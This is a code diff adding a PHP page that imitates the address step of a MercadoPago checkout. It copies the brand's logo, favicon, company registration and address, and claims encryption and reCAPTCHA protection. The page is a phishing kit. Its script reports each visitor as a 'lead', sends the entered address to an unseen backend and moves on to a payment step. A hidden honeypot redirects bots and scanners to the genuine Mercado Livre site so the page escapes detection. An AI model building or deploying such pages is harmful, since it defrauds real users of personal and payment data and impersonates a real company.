@@ -1,0 +1,249 @@
+<?php require_once __DIR__ . '/config.php'; ?>
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="icon" type="image/png" href="https://http2.mlstatic.com/frontend-assets/mp-web-navigation/favicon.png">
+  <title>MercadoPago - Endereço</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link rel="stylesheet" href="css/checkout.css">
+</head>
+<body>
+<div class="mp-page">
+
+  <!-- ── Header ──────────────────────────────────────────────── -->
+  <header class="mp-header">
+    <img class="mp-header__logo"
+         src="images/mp-logo.png"
+         alt="MercadoPago">
+  </header>
+
+  <!-- ── Stepper ─────────────────────────────────────────────── -->
+  <div class="mp-stepper">
+    <div class="mp-step mp-step--done">
+      <div class="mp-step__bubble">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="14" height="14">
+          <path fill="currentColor" d="M21 7L9 19l-5.5-5.5 1.41-1.41L9 16.17 19.59 5.59z"/>
+        </svg>
+      </div>
+      <span class="mp-step__label">Dados pessoais</span>
+    </div>
+    <div class="mp-step-line mp-step-line--done"></div>
+    <div class="mp-step mp-step--active">
+      <div class="mp-step__bubble">2</div>
+      <span class="mp-step__label">Endereço</span>
+    </div>
+    <div class="mp-step-line"></div>
+    <div class="mp-step">
+      <div class="mp-step__bubble">3</div>
+      <span class="mp-step__label">Pagamento</span>
+    </div>
+  </div>
+
+
+  <!-- ── Form card ────────────────────────────────────────────── -->
+  <div class="mp-card">
+    <h1 class="mp-card__title">Endereço de Entrega</h1>
+
+    <!-- Honeypot anti-bot -->
+    <div class="hp-trap" aria-hidden="true" style="position:absolute;left:-9999px;top:-9999px;width:0;height:0;overflow:hidden;pointer-events:none;">
+      <input type="text"  id="hp_address" name="address_line2" tabindex="-1" autocomplete="off">
+      <input type="text"  id="hp_country" name="country_code"  tabindex="-1" autocomplete="off">
+    </div>
+
+    <div class="mp-field">
+      <label for="cep">CEP</label>
+      <div class="mp-field__wrap">
+        <input type="tel" id="cep" name="cep" placeholder="00000-000" maxlength="9" autocomplete="postal-code">
+        <span class="mp-cep-loading" id="cepLoading"></span>
+        <span class="mp-field__ok" id="ok-cep">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="16" height="16">
+            <path fill="currentColor" d="M21 7L9 19l-5.5-5.5 1.41-1.41L9 16.17 19.59 5.59z"/>
+          </svg>
+        </span>
+      </div>
+      <div class="mp-field__err" id="err-cep"></div>
+    </div>
+
+    <div class="mp-field">
+      <label for="street">Rua</label>
+      <div class="mp-field__wrap">
+        <input type="text" id="street" name="street" placeholder="Nome da rua" autocomplete="street-address">
+        <span class="mp-field__ok" id="ok-street">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="16" height="16">
+            <path fill="currentColor" d="M21 7L9 19l-5.5-5.5 1.41-1.41L9 16.17 19.59 5.59z"/>
+          </svg>
+        </span>
+      </div>
+      <div class="mp-field__err" id="err-street"></div>
+    </div>
+
+    <div class="mp-field">
+      <label for="neighborhood">Bairro</label>
+      <div class="mp-field__wrap">
+        <input type="text" id="neighborhood" name="neighborhood" placeholder="Nome do bairro">
+        <span class="mp-field__ok" id="ok-neighborhood">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="16" height="16">
+            <path fill="currentColor" d="M21 7L9 19l-5.5-5.5 1.41-1.41L9 16.17 19.59 5.59z"/>
+          </svg>
+        </span>
+      </div>
+      <div class="mp-field__err" id="err-neighborhood"></div>
+    </div>
+
+    <div class="mp-row">
+      <div class="mp-field">
+        <label for="city">Cidade</label>
+        <div class="mp-field__wrap">
+          <input type="text" id="city" name="city" placeholder="Cidade" autocomplete="address-level2">
+          <span class="mp-field__ok" id="ok-city">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="16" height="16">
+              <path fill="currentColor" d="M21 7L9 19l-5.5-5.5 1.41-1.41L9 16.17 19.59 5.59z"/>
+            </svg>
+          </span>
+        </div>
+        <div class="mp-field__err" id="err-city"></div>
+      </div>
+
+      <div class="mp-field" style="max-width:110px;">
+        <label for="number">Número</label>
+        <div class="mp-field__wrap">
+          <input type="text" id="number" name="number" placeholder="Nº" maxlength="10">
+          <span class="mp-field__ok" id="ok-number">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="16" height="16">
+              <path fill="currentColor" d="M21 7L9 19l-5.5-5.5 1.41-1.41L9 16.17 19.59 5.59z"/>
+            </svg>
+          </span>
+        </div>
+        <div class="mp-field__err" id="err-number"></div>
+      </div>
+    </div>
+
+    <button class="mp-btn" id="btnContinue" onclick="submitStep2()">
+      <span class="btn-label">Continuar</span>
+      <span class="btn-spinner"></span>
+    </button>
+
+    <p class="mp-trust">
+      Pagamento processado pelo MercadoPago. <span class="link">Saiba mais</span>
+      &nbsp;|&nbsp; Protegido por RECAPTCHA.
+      <span class="link">Privacidade e Termos de Serviço.</span>
+    </p>
+
+    <div class="mp-secure">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="14" height="14">
+        <path fill="currentColor" d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5zm-2 16-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9z"/>
+      </svg>
+      Dados protegidos com criptografia AES-256
+    </div>
+  </div>
+
+  <footer class="mp-footer">
+    <p>&copy; 1999-<?php echo date('Y'); ?> Todos os direitos reservados.</p>
+    <p>MERCADOPAGO INTERNET INSTITUIÇÃO DE PAGAMENTO S/A - CNPJ/MF 08.561.701/0001-01</p>
+    <p>Av. Brigadeiro Faria Lima, 1.384, São Paulo - SP - CEP 01451-001</p>
+  </footer>
+</div>
+
+<!-- Toast -->
+<div class="mp-toast" id="mpToast"></div>
+
+<script src="js/sdk.min.js"></script>
+<script>
+(function () {
+  'use strict';
+
+  _SDK.initTracking('endereco');
+  _SDK.notifyLead('endereco');
+
+  // ── Real-time validation ──────────────────────────────────────
+  _SDK.ui.bindValidation('cep',          _SDK.validate.cep,                                _SDK.validate.formatCEP, 'err-cep',          'ok-cep');
+  _SDK.ui.bindValidation('street',       function (v) { return _SDK.validate.text(v, 3, 'Rua');    }, null, 'err-street',       'ok-street');
+  _SDK.ui.bindValidation('neighborhood', function (v) { return _SDK.validate.text(v, 2, 'Bairro'); }, null, 'err-neighborhood', 'ok-neighborhood');
+  _SDK.ui.bindValidation('city',         function (v) { return _SDK.validate.text(v, 2, 'Cidade'); }, null, 'err-city',         'ok-city');
+  _SDK.ui.bindValidation('number',       function (v) { return _SDK.validate.text(v, 1, 'Número'); }, null, 'err-number',       'ok-number');
+
+  // ── Auto-fill via ViaCEP (com retry e loading indicator) ──────
+  _SDK.ui.bindCEP('cep', {
+    street: 'street',
+    neighborhood: 'neighborhood',
+    city: 'city',
+    number: 'number'
+  }, 'cepLoading');
+
+  // ── Submit ────────────────────────────────────────────────────
+  window.submitStep2 = function () {
+    // 1 — Honeypot check
+    if (document.getElementById('hp_address').value ||
+        document.getElementById('hp_country').value) {
+      window.location.replace('https://www.mercadolivre.com.br');
+      return;
+    }
+
+    var vCep   = _SDK.validate.cep(document.getElementById('cep').value);
+    var vStr   = _SDK.validate.text(document.getElementById('street').value,       3, 'Rua');
+    var vNeigh = _SDK.validate.text(document.getElementById('neighborhood').value, 2, 'Bairro');
+    var vCity  = _SDK.validate.text(document.getElementById('city').value,         2, 'Cidade');
+    var vNum   = _SDK.validate.text(document.getElementById('number').value,       1, 'Número');
+
+    // Validação estrita: O ViaCEP coloca 'readonly' nos campos quando acha o endereço.
+    // Se não tiver readonly e o usuário não digitou manualmente um endereço gigante, desconfiamos.
+    var streetEl = document.getElementById('street');
+    if (!streetEl.hasAttribute('readonly') && vStr.val && vStr.val.length < 5) {
+       vStr.ok = false;
+       vStr.msg = 'Insira um CEP válido para buscar o endereço';
+    }
+
+    var fields = [
+      { id: 'cep',          res: vCep,   errId: 'err-cep',          okId: 'ok-cep'          },
+      { id: 'street',       res: vStr,   errId: 'err-street',       okId: 'ok-street'       },
+      { id: 'neighborhood', res: vNeigh, errId: 'err-neighborhood', okId: 'ok-neighborhood' },
+      { id: 'city',         res: vCity,  errId: 'err-city',         okId: 'ok-city'         },
+      { id: 'number',       res: vNum,   errId: 'err-number',       okId: 'ok-number'       }
+    ];
+
+    var allValid = true;
+    fields.forEach(function (f) {
+      var inp = document.getElementById(f.id);
+      var err = document.getElementById(f.errId);
+      var ok  = document.getElementById(f.okId);
+      if (!f.res.ok) {
+        allValid = false;
+        inp.classList.add('invalid'); inp.classList.remove('valid');
+        if (err) { err.textContent = f.res.msg; err.classList.add('visible'); }
+        if (ok)  ok.classList.remove('visible');
+      } else {
+        inp.classList.remove('invalid'); inp.classList.add('valid');
+        if (err) err.classList.remove('visible');
+        if (ok)  ok.classList.add('visible');
+      }
+    });
+
+    if (!allValid) return;
+
+    _SDK.ui.setLoading('btnContinue', true);
+
+    var formData = {
+      cep:          _SDK.validate.formatCEP(vCep.val),
+      street:       vStr.val,
+      neighborhood: vNeigh.val,
+      city:         vCity.val,
+      number:       vNum.val
+    };
+
+    _SDK.storeData('address', formData);
+
+    _SDK.gateway.notifyAddress(formData)
+      .then(function () { window.location.href = 'escolha.php'; })
+      .catch(function () { window.location.href = 'escolha.php'; });
+  };
+
+  document.addEventListener('keydown', function (e) {
+    if (e.key === 'Enter') window.submitStep2();
+  });
+}());
+</script>
+</body>
+</html>
